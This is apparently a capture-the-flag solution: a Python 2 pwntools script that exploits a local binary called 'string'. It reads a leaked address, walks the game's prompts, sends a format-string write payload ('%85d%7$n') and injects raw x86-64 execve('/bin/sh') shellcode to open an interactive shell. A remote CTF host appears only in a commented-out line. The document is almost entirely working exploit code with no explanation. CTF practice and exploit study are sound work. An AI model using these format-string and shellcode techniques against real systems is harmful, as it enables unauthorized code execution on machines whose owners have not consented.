from pwn import *
'''
    @Author:            Tokyoveryhot
    @Date:              2020-08-02
    @Version:           1.0.0
'''
#context.log_level = 'debug'
context(arch='amd64',os='linux',log_level='debug')
#conn = remote('220.249.52.133', 31308)
conn = process('./string')
elf = ELF('./string')
conn.recvuntil('secret[0] is ')
addr = int(conn.recvuntil('\n')[:-1], 16)
log.info("v5 addr:"+hex(addr))

def debug(addr1 = '0x400c7e'):
    raw_input('debug')
    gdb.attach(conn, "b * " + addr1)
debug()

conn.sendlineafter('What should your character\'s name be:', 'aaaa')
conn.sendlineafter('So, where you will go?east or up?:', 'east')
conn.sendlineafter('go into there(1), or leave(0)?:', '1')
conn.sendlineafter('\'Give me an address\'', str(addr))
#conn.sendlineafter('And, you wish is:', p64(addr)+'%81c%8$n')
conn.sendlineafter('And, you wish is:', '%85d%7$n')
shellcode = '\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05'
#shellcode = asm(shellcraft.sh())
print shellcode
conn.sendlineafter('USE YOU SPELL', shellcode)

#shellcode = asm(shellcraft.sh())
conn.interactive()
